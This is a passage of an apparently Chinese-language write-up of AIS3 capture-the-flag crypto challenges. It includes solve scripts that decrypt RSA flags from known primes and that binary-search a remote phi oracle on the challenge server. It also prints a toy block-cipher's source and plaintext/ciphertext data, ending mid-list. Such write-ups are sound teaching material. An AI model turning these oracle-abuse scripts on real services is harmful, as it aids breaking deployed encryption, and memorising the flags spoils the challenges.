<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, inverse</span><br><span class="line"></span><br><span class="line">e = <span class="number">999410543</span></span><br><span class="line">FLAG1_encrypted = <span class="number">2019965040244116395512178744223716745902792067770406126662974709088696545359770595407839044425447697326283244725545691184827888464156713552649204295359275480753469221179167758150689</span></span><br><span class="line">p2 = <span class="number">1936452218017271194954702287677501605001979682336194309677013505082932595142014607788414273</span></span><br><span class="line">p1 = <span class="number">1936452218017271194954702287677501605001979682336194309677013505082932595142014607788414239</span></span><br><span class="line"></span><br><span class="line">FLAG1 = <span class="built_in">pow</span>( FLAG1_encrypted, inverse( e, ( p1 - <span class="number">1</span> ) * ( p2 - <span class="number">1</span> ) ), p1*p2 )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(FLAG1)[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = (p1**<span class="number">5</span> - <span class="number">1</span>)/(p1-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">149954396473885217746197414809229206412778630163803272184649398952876192012209147221523034745341208118854559157773926560759397553612440131474151380385964099586065371542213208640241734553130593323500437197260056914179924924464513480017264830297291527451181554956011816511870082810566848354059928997951913647973082006923290399509944774838277985941685837467515611578494799030640120190421087671393870603547388670176819495607820621069378152812989620472797143430709626624522177943214714132733906097997788663359956326334169125084060561583826430377899249430430453050318194794387778825575775058737368531577795474317139110268235783213214420729578406811802322828402416990448539842567455351400137952526215556122390605289165515288289867</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> N % x == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">y = N / x</span><br><span class="line"></span><br><span class="line">FLAG2_encrypted = <span class="number">21308012834506046132097278767575318150256642739580028013522530722239664545565491539132463158211221794477508851221919019459496528895930338919109942060265032102326303934613362396630853503930182630310611368229454116405427762559884771830034760705181289964222590946186941099439734615484452946258766128609814959567596659572919817110202799504054938168907069934736490913777793524784977221285686068919673939675440585048808210274995815616062581586378785387681296187201326254141407944002182328912020674622554304780686556757456646210651659310907424440866387920022355253233962376389436323827177890924471529587891657988026174277399233514423411525522313866248310608556679234085511484114924351835637814645004752499078546220777394942328399</span></span><br><span class="line"></span><br><span class="line">FLAG2 = <span class="built_in">pow</span>( FLAG2_encrypted, inverse( e, ( x - <span class="number">1</span> ) * ( y - <span class="number">1</span> ) ), N )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(FLAG2)[<span class="number">2</span>:-<span class="number">1</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>拿到flag: <code>AIS3&#123;S0me7im3s_I_h4tE_factorDB&#125;</code></p>
<h3 id="RSA101"><a href="#RSA101" class="headerlink" title="RSA101"></a>RSA101</h3><p>覺得最有趣的一題XD，也有可能他是最像OI的那種題目吧</p>
<p>首先nc上去會拿到public key跟被加密的flag，顯然我們是要透過某種方式得到一點N相關的資訊</p>
<p>那他很好心的提供了一個phi oracle，對於一個輸入的$x$會回傳${x\mod{\varphi(N)}}\mod{64}$</p>
<p>觀察發現$\varphi(N)$是64的倍數的機率應該不高，所以我們可以知道若是給出一個介在$[\varphi(N),2\varphi(N))$的數$x$，那回傳的值將與$x\mod{64}$不同，而要是$x&lt;\varphi(N)$則回傳的值總是與$x\mod{64}$相同，於是我們就有一個可以二分搜驗證是否$x\geq\varphi(N)$的函數了</p>
<p>不過我們要怎麼找到一個介在$[\varphi(N),2\varphi(N))$的數呢，發現當$N$足夠大的時候，$N$一定會是一個合法的數，所以我們直接二分搜$[0,N]$之間$\geq \varphi(N)$最小的數即可得知$\varphi(N)$，有了$\varphi(N)$之後就直接做個簡單的逆元之類的就可以解密了</p>
<p>這裡附個我寫的簡單腳本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pre-exam-chals.ais3.org&#x27;</span>, <span class="number">10201</span>)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;Public-key (e,N) : (&#x27;</span></span><br><span class="line">encrypt_key, n = <span class="built_in">map</span>(<span class="built_in">int</span>,r.recvline().strip()[<span class="built_in">len</span>(prefix):-<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;Encrypted Flag : &#x27;</span></span><br><span class="line">encrypted = <span class="built_in">int</span>(r.recvline().strip()[<span class="built_in">len</span>(prefix):])</span><br><span class="line"></span><br><span class="line">r.recvline().strip()</span><br><span class="line">r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;&gt; query &quot;</span> + <span class="built_in">str</span>(x)</span><br><span class="line">    s = r.recvline().strip()</span><br><span class="line">    <span class="keyword">assert</span> s == <span class="string">&#x27;n = ?&#x27;</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">    prefix = <span class="string">&#x27;(n % phi) % 64 =&#x27;</span></span><br><span class="line">    s = r.recvline().strip()[<span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">return</span> x % <span class="number">64</span> != <span class="built_in">int</span>(s)</span><br><span class="line"></span><br><span class="line">L, R = <span class="number">0</span>, n</span><br><span class="line"><span class="keyword">while</span> R - L &gt; <span class="number">1</span>:</span><br><span class="line">    M = ( L + R ) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> query( M ):</span><br><span class="line">        R = M</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L = M</span><br><span class="line">decrypt_key = inverse(encrypt_key, R)</span><br><span class="line">plain = <span class="built_in">pow</span>(encrypted, decrypt_key, n)</span><br><span class="line">p = make_packer(<span class="string">&#x27;all&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> plain</span><br><span class="line"><span class="built_in">print</span> p(plain)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑完就可以拿到flag: <code>AIS3&#123;RSA_L0L_01100110011101010110001101101011&#125;</code></p>
<h3 id="CbC"><a href="#CbC" class="headerlink" title="CbC"></a>CbC</h3><p>首先拿到一個加密程式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.7</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">P = [</span><br><span class="line">    (<span class="number">0</span>, [<span class="number">1</span>, <span class="number">7</span>]),</span><br><span class="line">    (<span class="number">1</span>, [<span class="number">0</span>, <span class="number">8</span>]),</span><br><span class="line">    (<span class="number">0</span>, [<span class="number">5</span>, <span class="number">3</span>]),</span><br><span class="line">    (<span class="number">1</span>, [<span class="number">8</span>, <span class="number">6</span>]),</span><br><span class="line">    (<span class="number">0</span>, [<span class="number">3</span>, <span class="number">9</span>]),</span><br><span class="line">    (<span class="number">1</span>, [<span class="number">4</span>, <span class="number">0</span>]),</span><br><span class="line">    (<span class="number">0</span>, [<span class="number">9</span>, <span class="number">1</span>]),</span><br><span class="line">    (<span class="number">1</span>, [<span class="number">6</span>, <span class="number">2</span>]),</span><br><span class="line">    (<span class="number">0</span>, [<span class="number">7</span>, <span class="number">5</span>]),</span><br><span class="line">    (<span class="number">1</span>, [<span class="number">2</span>, <span class="number">4</span>]),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2B</span>(<span class="params">b,length=BLOCK_SIZE</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(b)[<span class="number">2</span>:].rjust(BLOCK_SIZE, <span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">B2n</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, b)), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">b</span>):</span></span><br><span class="line">    l = BLOCK_SIZE // <span class="number">2</span></span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; l) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (b &gt;&gt; l) | ((b &amp; mask) &lt;&lt; l)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitchain</span>(<span class="params">cb, state=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cb) == <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">return</span> cb</span><br><span class="line">    b, ns = P[state]</span><br><span class="line">    b0, bn = cb[<span class="number">0</span>],cb[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> [b0 ^ b] + bitchain(bn, state=ns[b0])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blockcipher</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> B2n(bitchain(n2B(b)))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CbC</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, k, rounds</span>):</span></span><br><span class="line">        self.key = [k]</span><br><span class="line">        self.rounds = rounds</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.rounds):</span><br><span class="line">            k = swap(blockcipher(k))</span><br><span class="line">            self.key.append(k)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, b</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.rounds):</span><br><span class="line">            b ^= self.key[i]</span><br><span class="line">            b = blockcipher(b)</span><br><span class="line">            b = swap(b)</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = <span class="built_in">bytes</span>.<span class="built_in">hex</span>(os.urandom(BLOCK_SIZE // <span class="number">8</span>))</span><br><span class="line">    key = <span class="built_in">int</span>(flag, <span class="number">16</span>)</span><br><span class="line">    C = CbC(key, <span class="number">99</span>)</span><br><span class="line">    print(<span class="string">&quot;Flag : AIS3&#123;%s&#125;&quot;</span> % flag)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            pt = <span class="built_in">int</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(os.urandom(BLOCK_SIZE // <span class="number">8</span>)), <span class="number">16</span>)</span><br><span class="line">            ct = C.encrypt(pt)</span><br><span class="line">            f.write(<span class="built_in">str</span>((pt, ct)) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>還有一份看起來是被用這隻程式加密過的檔案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">(76173805501177359573786250867826865667623985658852407459502964711159068527937, 7132216118997241161329301114592304948838945360663660382939528954550389872641)</span><br><span class="line">(18259599554523339924354916972836021973679987578903457584295302821262289008661, 13661945238357131965278901963492331507615754140652995774563485162413720908476)</span><br><span class="line">(111867993836344685305354979271598599689038955287840401482941111566624201218690, 14868508557585259965173960261910313536021350887737172794878520514028357921848)</span><br><span class="line">(25520424228118442633426803063340671008726381199333700311076279513540075930511, 59412252597669248481748421933639240160727107991257739857312674717617187933276)</span><br><span class="line">(109312337153290902152325366120215179831150844421719160889039226243454610500804, 61953012052453834464184633353451595079137407148104548764093883414752340440623)</span><br><span class="line">(49834177873175086538554122785651747601414009925610205465355309214692341303036, 21931613714345197126093982439060948713682268903447270984806238070314445411910)</span><br><span class="line">(46069862077394656182838358951102531117651297713931904588423242067953011371852, 321568563823051206822193421237271047113722177520857783571017987729033106671)</span><br><span class="line">(5862401748390887936549102477710924285206916794647976340837396234164803132415, 2295355531498772304959506693145738002154654320514696352686094617657016637958)</span><br><span class="line">(18275227147836622499204609359879760512352374793876023167905151131317452620835, 20423682285165220149576449210053319981583525391656409568857885128752205900668)</span><br><span class="line">(38265894422551672585538638213944909970183942182184960420389195813575281279047, 76780386130149271780200012015755454918176308183506430272557453113443534955269)</span><br><span class="line">(16640875100179870724061305550205597130235440664345105226523502556240323996301, 21400800143682935516085009665518120005214678451613027596169480711723808498462)</span><br><span class="line">(15791904427407969457829693487854900277372793792427607506796714872221422364074, 80602293244928932847068942154728349038718552668940374314472748906254561015280)</span><br><span class="line">(69476229325002812857253913084793910080584984101541594865005382851359765673837, 664803459122473418150454058069428695502109597606425554850117158065306228072)</span><br><span class="line">(67783841493468895431930008094148390558031264761855976762130539702474137044969, 103987617859850362573646653794207652490263859876199516979784488710056753056214)</span><br><span class="line">(88868390756618272075222317303991022287748188767969112544575266575996328817115, 80419515989319231589534482900448001941725061309494626046415734521591333179730)</span><br><span class="line">(72437793117445221003310450735311671875974483504454200265385166399776129927836, 82983756119428667829336614534730622471742622550332534685240869706570061474207)</span><br><span class="line">(20283153464087034261187186510447103290819109100936894615968117364299424528270, 113331071292301751919988916828658143143236999417281003766608777998269017413130)</span><br><span class="line">(19188068272125346203771068203136929842711248916508062841822019349509032960752, 81693057377091398357653972581227794044696253175714716014338180628418581598406)</span><br><span class="line">(45348061245302259043145275613537043760915066469332918257842627542465150799738, 16679582638086544714959604556370079789204347740143370410890509669327574225160)</span><br><span class="line">(34471712829043383942901876339750808396420214733886321669014415428197740648257, 3676584506346753036505536295251285508680345011674937065903923169468533237013)</span><br><span class="line">(32038615213601909738988684828496859884827514911397000317912561937968589564276, 214776750974791192909586352796767252441290698341887031682712887793752290554)</span><br><span class="line">(46886245361072254741380945622364844861752660541007522047311464170089094737761, 38397035851732367910248064853948835642310284442016058877991613704504594794617)</span><br><span class="line">(92796509164185660208183013268147407632665701907704351206891292840309386686955, 72575478984190081759421974616089060158864652110874452201221025515557494939425)</span><br><span class="line">(107708307852088398917310637458780900979044339565511242061341799534987385152021, 86581257753431736061277708713003079111367211238814522849689130520032447768116)</span><br><span class="line">(37755501821705493899148733113545644907298112963613422055738860324916117067839, 80136483702374171107319683478868469943758284972835154881932538017865780316230)</span><br><span class="line">(36755111865310807728097279956665507098485926303491197165928523552399696741310, 103416096083990773470599491457750171564009842142894399286090825388600200577423)</span><br><span class="line">(62429769171250432565337970275928595897649862371613583105938656509790132798733, 47817940939231426265501238104809030793205147207062473397395380877417030245131)</span><br><span class="line">(40432315600434179027976406930526009192798722441923883688433087729669235655904, 16619707109296026749362255715407963014939927102346276772094819369934542462936)</span><br><span class="line">(32770673101468573334745826861404664798389315063538645806837393651909551536536, 100401781428278697585391151558125732567401693365612240823401685453468170478900)</span><br><span class="line">(39839428061975701969713438995107260541398536023063144825665801479635230377333, 41558268187794203967580506585717811783884660475402664948173436421220558479144)</span><br><span class="line">(29624366642549599967122261681142880798569189712725170900312037283370629635196, 30363495017214074940201388559237247852769705457211026445985904742143582133129)</span><br><span class="line">(114679539158297417894748218509512742432909565995945900037400950871875444535842, 92714949347339299767235110519416446027169631917587951279299036804516341667856)</span><br><span class="line">(2329971907905478800326651954302945282930262145339147170676066072017817347252, 32684641986411479312550457277619874489598581586890494361458537978409864064552)</span><br><span class="line">(65377215854149495892530264494977722795440241412636322742625019531356240801609, 114766255624991710136950530511254346836717104427356310724603089667559363114286)</span><br><span class="line">(80869283633790344996290310557845213635746506670495284021465148207830026226260, 24123246878630744157215280216742595036789975236434259051189847258702817357728)</span><br><span class="line">(34184370886922033374515627200318579377956745586794466213171497332961029221070, 41580091010627970219721874074052462315723609200551877628345598109643626578870)</span><br><span class="line">(15773941326914210874985274698891867065248693824868334843574764231988288974957, 68980538320779185958958068434503300527486377237762853547438156367521546117631)</span><br><span class="line">(102591623672241462457942680527362085721202218889503195449391205702675656560289, 100543345722192334101587765258710016039824731094340516436990172906828537712903)</span><br><span class="line">(70779528793799182923957642944150146531643531701967930809387126892206761384699, 13746724481828623588938847104886615850750613118007107675332921950992556176216)</span><br><span class="line">(59302718624182530127436617516954149448475088865305428678132809648894441019916, 88549697608601633252494307664323824805070194956899568871840692819551537052929)</span><br><span class="line">(91897905887725247289701334011116293483354911383322561659331569241581503611219, 4910863809058995865543671435316499549040906017489510856680511805979346339995)</span><br><span class="line">(43087267289874348781357294373707212542984186791841902263600304249053137204372, 38471500808215646377043027234704998780970472440551400712423890093470717827431)</span><br><span class="line">(75170119056341155888460788074525062321141558660921807791219720383285160602467, 43245574203068466374324498730930258847824964665608222316185238653592999077937)</span><br><span class="line">(97519619432682059103580855321445069617233519398383460684277744901604857752505, 18206751288004379677505014956200652303319817191647457651693609950534040472329)</span><br><span class="line">(34664007318726423893919069106241523806892146341886731470608510742962677134961, 106378496820303575876058549472862461550185854131541240135417874711634578177818)</span><br><span class="line">(32586978507452874063642364048766055880186526730381535462458265827085271527240, 113791425815122118729695522116283704655534085484597793521751007714121780749149)</span><br><span class="line">(114348445678504717217546510861123209136538698975664254100160334190963033921866, 64709241331679537316394416277220528145101155967950097198291946492285422133903)</span><br><span class="line">(22869029755741039875854375644183818308945261340702744944645980783088176627603, 38886445477861555198259541592613644662608056592567064997188975239236036639793)</span><br><span class="line">(22765329517251504994547613287090013685536983197418217362662871341472163233709, 46307575066499039921054184654690904420743980432822415027698512446797179994304)</span><br><span class="line">(24809758517265550316026713475082101337380636811787323340821820876443671206477, 105350584173904714597945844875287871704127112875020531490602388287653245353177)</span><br><span class="line">(3679726937273217480153978517563832882494734519855185148508984515839538705478, 102520273502250936991545619015852898835777837000983495202229620419623545696127)</span><br><span class="line">(80936188967147522360860162079341860431450871064074245429739108172316447056728, 113634009282668232887874956237915458881057475204547052294171104680090483065338)</span><br><span class="line">(53090034186907114140086369485992993172528156438934139000625339245859526983030, 61623489550085867507296755077345388729974661878973257889031230307793442036486)</span><br><span class="line">(112844433373826102007687787137701994253802603965838930290282214960217672041261, 84753053738848355898439100782857142840867891234612182065681395670268913248641)</span><br><span class="line">(42226372419530092955210798771492078475061625966765269299919191095442798929222, 12615687081082540143469369589065661482252407168605384319953710736588835255455)</span><br><span class="line">(48034087306492366864172409167078568286432948382897801954434920545172845037074, 92490775831875059245089722164217808684470521408807561358584510102329093755394)</span><br><span class="line">(16618175121271914132074629168712047688202959596606890215406128210702882682707, 42974597671429991098253471114012265687326741976458979611962187186328345596471)</span><br><span class="line">(96674590810162370823785731176255930068581506260955420124275772133239311191781, 16427961480711219752887126744933265241213892915285060229523666886906050587403)</span><br><span class="line">(96732483847618001737908455474222296136157366531053608250329416521287140889867, 63598474033749815607291915406476573799944521429012548027391549011454446464928)</span><br><span class="line">(75151567806406350898706233115851392419408096529261110927661385066873630289649, 32977287118008817607992449016339408505413198798663778669712665558842659125986)</span><br><span class="line">(102571937142233090349049676929495415068948718300627096325768005562794844340066, 85671014989413451796420074458240087802018803976698593724270254151022168510273)</span><br><span class="line">(24324696385005587566636085720128995126281399706305172623143291484449436099911, 34544202109888688246652186044913548462419618135769327940020237093146309165597)</span><br><span class="line">(5445192476171635301466918411319052163987636862969178073654777974106777264617, 4277498444753140558099168795023280972620825169416026723250045321426562657049)</span><br><span class="line">(19647402601481004694815773547525663941638210998005578575193321327533496298606, 32395518797308895454651931388444090699656164921832729695818457661396354457593)</span><br><span class="line">(75643031214128013154890167986828430460024389263735781657148540798563318309715, 4868031619880607625529997978217018900416801328319437855781875609648872391870)</span><br><span class="line">(113893204869681915149618354002190616665919850697932456840786165962996653931500, 76382150950948657548406005865146203044673083755067535921146695572862092940752)</span><br><span class="line">(59008989508660819023883646090481085737943646044355224747897643710280507164669, 114958003869676718813641722332611208423032067881014200969514785462408689244205)</span><br><span class="line">(21431969888121465884515152574314269138509531982139722696361733711076254351232, 28199498534305633961665412720948573442276931903500849597349031958281470192857)</span><br><span class="line">(111069801987996378767132358973890068497815131616643426781123023587081225630634, 107666470820062362453088814277707048926143723858401302829914465046049061834251)</span><br><span class="line">(6035745391531174767302430474805364215210591244030352867078794104250725594458, 87327569118968695062931346087549095451884990452268419325402544722272636023475)</span><br><span class="line">(5474650511467838492930861948597649354218206084527349216123510155063215431709, 75427576960384096751203366189289609405393630077361509482006610530949610623766)</span><br><span class="line">(26913845003360477798758476474987189004873229838238185336581150912111060980986, 28472086314122005833743734419861407261278240677720077873955530839479376317627)</span><br><span class="line">(21947148058416974964299409241294853134588863074666540418557991364755572299156, 89926084973667179850210982586549021896385011509152643857812060768058807170750)</span><br><span class="line">(11426200901354934684055684004403086575935785460410755389018205128253961717445, 58355146206164277985180918505949413660802883447958174510400580040464355343560)</span><br><span class="line">(54017997741870908565976154493376499129105512177284018449969619991904244521378, 2784688859458966923406592850494885981361905384484377708335693004733383337304)</span><br><span class="line">(30207052283075459653555066930068254268762792635193595548258396080078929006274, 85470910729685570341423085232155399159977296625879635805497735363503094252970)</span><br><span class="line">(63193492936895022535453443429065996233885099860903635709903434923432496723318, 91421935592834419458240808507304616875199475525659726266732532665658813240099)</span><br><span class="line">(83958410297910555455675193987864173141594021131740849849634038834178070316083, 98685108568828007262327978686921556595918057257419087311805566324061463530597)</span><br><span class="line">(12628756772255550276466649308187718476794746104712920675103418532854746838927, 2963294469147815208291959045075427665294777206994200304994016009578810349110)</span><br><span class="line">(100690268052072490754521665876719030147213525944549627620287925972942224918304, 28429357104859359341698260609433015613968600521109952639495936664007080886476)</span><br><span class="line">(891402931021741750614689177244866391786149653639059777121225134844428981073, 103413508626102787264920368457141278742635318395522256968435674377278825283596)</span><br><span class="line">(8779951758339617186897641591407637216744376573096281986107725856001372898875, 45396294457905845388591162003419915608364964921050433180109811949018058247134)</span><br><span class="line">(81192238844493948000444790191066457053453502617369983016849374039390463935911, 68027629841319872592216071937408601035513167500221693324360144331162117877408)</span><br><span class="line">(5132257625224286050454192298392584083920933279471283416713941076130971920115, 51804399591163709095346834862560312542418825822449523866591004178258353314861)</span><br><span class="line">(79526795306461585660349485040797289661838334625957890882786982732140076282066, 40924413490524667273639368439784294858268253084904206507885057231434736197473)</span><br><span class="line">(54407154684005432635400640002083435774379259683373905258980532646601556588889, 9399430811769544739948210287374184975534915384415780552552149543340802011398)</span><br><span class="line">(34893093155597722897019843988109787484664177686384515429436279573549132310837, 35060150423737612500485377023963810624487647027957179821655124895447557042330)</span><br><span class="line">(64393370872990384111490342768857747292371271854079654068720709706067004896868, 27114540371847985794026636288912583646818270150810355957385696237237527838017)</span><br><span class="line">(108241519219897706497813210210615553632178192386845667806810715539850804017701, 107938378374659706348913516941149121512885922901550772820173368052020525332473)</span><br><span class="line">(30904415162438285464591827004189563473937084179872413545003437780294275012232, 108166551064710039626210525249572004488094008482878601326886149243814356132333)</span><br><span class="line">(41085934816636925304090154072229702138753284058593592699039673277989522711437, 34488547432051153923279797030701978930757536399124597284937667068692142982560)</span><br><span class="line">(78817878628326663197800141670021311011544107794956717428309374473657747874517, 35258172858934987472320651513926237935850682697374329516764217579632026362237)</span><br><span class="line">(31454032676843765690913895431058569347904139768768480547863081854889136031892, 28389403330162763145092858145246433232288495997366115306500334226150884162156)</span><br><span class="line">(47161977250883793825480141045819402114076441707371193749315393168431680187085, 115119030925087444280226573546288977640846931347165275495738041858735240288780)</span><br><span class="line">(11360678046835250472755231560180105314107647212704858063460076442639922335375, 25150810057749580657484214725971286132682916355119069776712251111816126530284)</span><br><span class="line">(53038863053111061188406390045497493287152472544502002369428701165320229181713, 